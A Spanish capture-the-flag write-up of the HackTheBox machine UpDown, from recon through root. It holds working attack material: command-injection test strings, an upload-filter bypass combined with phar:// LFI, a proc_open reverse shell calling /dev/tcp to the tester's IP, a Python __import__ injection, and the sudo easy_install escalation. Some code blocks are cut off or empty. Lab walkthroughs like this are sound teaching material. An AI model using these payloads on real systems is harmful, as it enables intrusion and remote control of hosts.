# Updown

![](../../../../~gitbook/image.md)Publicado: 05 de Mayo de 2025
Autor: José Miguel Romero aka x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
"SiteIsUp" es una máquina Linux de dificultad fácil en HackTheBox que simula un servicio web para verificar si otros sitios están en línea. La vulnerabilidad principal radica en una aplicación web con múltiples fallas de seguridad, incluyendo un repositorio Git expuesto y un LFI (Local File Inclusion) que puede ser aprovechado para conseguir RCE (Remote Code Execution). Para la escalada de privilegios, se abusa de permisos sudo en la herramienta easy_install. Este laboratorio es perfecto para practicar reconocimiento web, análisis de código fuente, bypass de restricciones de subida de archivos y explotación de vulnerabilidades comunes en aplicaciones web.
###🚀 Metodología

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
![](../../../../~gitbook/image.md)⚠️ Debemos agregar este dominio a nuestro archivo hosts.💉 Probando inyecciones de comandosTras probar con diversos payloads para ver si podemos realizar inyección de comandos sobre el parámetro del campo de texto, no muestra un mensaje en el que indica que está detectando un intento de hacking:![](../../../../~gitbook/image.md)🕷️ Fuzzing de vhosts![](../../../../~gitbook/image.md)⚠️ Debemos agregar este dominio a nuestro archivo hosts.
###🌐 Enumeración Web
A continuación verificamos que no tenemos permiso para acceder a este recurso.![](../../../../~gitbook/image.md)Realizamos fuzzing de directorios usando feroxbusterEncontramos un directorio .git:![](../../../../~gitbook/image.md)A continuación usamos la herramienta git dumper para facilitar la revisión del repositorio de código.Una vez descargado el código, en el fichero changelog encontramos información que podría ser interesante:![](../../../../~gitbook/image.md)También hay un parámetro especial "only4dev" que se puede enviar e la cabecera de la petición![](../../../../~gitbook/image.md)A continuación, hacemos una petición a http://dev.siteisup.htb interceptando con Burp y probamos a añadir este parámetro en la cabecera![](../../../../~gitbook/image.md)Podemos usar también la extensión para firefox https://addons.mozilla.org/es-ES/firefox/addon/simple-modify-header/:![](../../../../~gitbook/image.md)Al hacer esto descubrimos un enlace al panel de administrador y un botón para la subida de archivos.![](../../../../~gitbook/image.md)En lo que respecta al enlace del panel de administrador, vemos que somos redirigidos a:http://dev.siteisup.htb/?page=admin![](../../../../~gitbook/image.md)Echando un vistazo al código fuente de esta sección vemos qué parámetro se acepta en la petición que nos permite apuntar a un recurso aunque se están aplicando ciertos filtros para evitar un posible LFI:![](../../../../~gitbook/image.md)Respecto al botón para la subida de archivos:![](../../../../~gitbook/image.md)Si revisamos el código fuente anteriormente descargado del repositorio .git en checker.php:![](../../../../~gitbook/image.md)Podemos ver las extensiones para la carga de archivos que están permitidas. También podemos ver que se crea un directorio en uploads/ obteniendo el timestamp de la hora de la subida y aplicado posteriormente la codificación en md5.También es importante verifica que el archivo se borra una vez después de subirse.Comprobamos que el directorio /uploads está vacío:![](../../../../~gitbook/image.md)Vamos a intentar subir un archivo php con alguna extensión que permita saltarnos la restricción de extensión, por ejemplo usando la webshell de pentestmonkey y renombándola con extensión .phar:Verificamos que el fichero se ha subido correctamente y tal como habíamos analizado previamente en el código, sea ha creado un directorio con el timestamp de la fecha codificado en MD5:![](../../../../~gitbook/image.md)El problema, es que el enlace al archivo se está borrando después de subirse.![](../../../../~gitbook/image.md)
###💉 Explotación
Recapitulando, en este punto tenemos por un lado, un parámetro page (http://dev.siteisup.htb/?page=XXX) que nos permite leer archivos desde la raíz y que cuando le pasamos un valor le concatena la extensión .php. Por otro lado, conocemos las extensiones que se están filtrando al intentar subir un archivo.En este punto la mejor opción sería encapsular nuestro archivo .php dentro de un archivo .zip y leerlo con un wrapper .zip, aunque lo descartamos porque la extensión .zip se está filtrando, así que lo que podemos hacer es comprimirlo con una extensión cualquiera que no se esté filtrando e intentar leer el código .php con un wrapper php. Ejemplo:Creamos nuestro archivo .php haciendo un phpinfo y de esta forma podemos ver qué funciones están deshabilitadas:info.phpSubimos el archivo.![](../../../../~gitbook/image.md)Usamos el wrapper php en la url con el paámetro page para llamar a nuestra shell⚠️ No Debemos agregar la extensión php a nuestro archivo ya que recordemos que tal como vimos en el código fuente se le está concatenando al final.![](../../../../~gitbook/image.md)A continuación verificamos las disable_functions:![](../../../../~gitbook/image.md)Para verificar qué función podemos usar, podemos utilizar la herramienta dfunc-bypasser a la cual podemos pasarle una url con el php.info y te indica de qué función de sistema php puedes abusar para ejecutar comandos:https://github.com/teambi0s/dfunc-bypasserPodemos usar la herramienta con el parámetro --file especificando el arhivo info.php. Para ello podemos interceptar la petición con burp y en la respuesta renderizada hacer un copy to file:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)La herramienta nos indica que podemos usar proc_open. Para ver cómo usar esta función podemos hacer uso de la documentación oficial:https://www.php.net/manual/en/function.proc-open.phpPodemos adaptar nuestro archivo .php para que haga uso de esta función y obtener una reverse shell de la siguiente forma:reverse shell con proc_open functionCreamos nuestra reverse shell y la encapsulamos con cualquier extensión que no esté filtrada:Tras subirla, iniciamos un listener en el puerto que hayamos especificado volvemos a hacer uso del wrapper para llamarla:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Tras ganar acceso, hacemos un full tty de nuestra shell:Encontramos un script en python sobre el que el usuario www-data tiene permisos de lectura y ejecución:![](../../../../~gitbook/image.md)El script parece que toma la entrada del usuario sin sanitizarla. Podemos abusar de esto pasándo el siguiente parámetro a la función y escalar a developer:![](../../../../~gitbook/image.md)Seguimos sin tener permisos para leer la flag de /home/developer:![](../../../../~gitbook/image.md)Dado que sí tenemos permisos para leer el directorio .ssh, vamos a usar la clave ssh para conectarnos:![](../../../../~gitbook/image.md)
###🔐 Escalada de Privilegios
Verificamos posibles archivos que puede ejecutar developer como root:![](../../../../~gitbook/image.md)Encontramos información sobre este binario y posibles formas de explotación en gtfobins:https://gtfobins.github.io/gtfobins/easy_install/#sudo![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💉 Explotación](#explotacion)
- [🔐 Escalada de Privilegios](#escalada-de-privilegios)

```
ping -c2 10.10.11.177
PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.
64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=49.0 ms
64 bytes from 10.10.11.177: icmp_seq=2 ttl=63 time=48.5 ms

--- 10.10.11.177 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 48.539/48.760/48.982/0.221 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.177 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
nmap -sC -sV -p$ports 10.10.11.177

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

```
10.10.11.177 - siteisup.htb
```

```
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```

```
http://www.google.es; whoami
324234234 || ls
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://siteisup.htb -H 'Host:FUZZ.siteisup.htb' -fs 1131
```

```
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://siteisup.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --scan-dir-listings -C 403,404
```

```
git_dumper http://siteisup.htb/dev git-dump
```

```
Special-Dev
only4dev
```

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.phar
```

```
mousepad info.php
```

```

```

```
zip test.pwned info.php
```

```
http://dev.siteisup.htb/?page=phar://uploads/92b4ba864769f5ab9b0708c96412332a/test.pwned/info
```

```
dfunc_bypasser --file info.php
```

```
["pipe", "r"], // STDIN

1 => ["pipe", "w"], // STDOUT

2 => ["pipe", "w"], // STDERR

];

$command = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'";

$process = proc_open($command, $descriptorspec, $pipes);

if (is_resource($process)) {

fclose($pipes[0]); // Close STDIN

fclose($pipes[1]); // Close STDOUT

fclose($pipes[2]); // Close STDERR

proc_close($process);

}

?>
```

```
zip revshell.test shell.php
```

```
http://dev.siteisup.htb/?page=phar://uploads/64fbd80378990182b061d4ceca662019/revshell.test/shell
```

```
SHELL=/bin/bash script -q /dev/null
```

```
./siteisup
__import__('os').system('/bin/bash')
```

```
chmod 600 id_rsa_developer
ssh -i id_rsa_developer developer@10.10.11.177
```

```
developer@updown:/home$ cd developer
developer@updown:~$ cat user.txt
*****************e96462e932704
```

```
# cd /root
# ls
lib  root.txt  snap
# cat root.txt

```
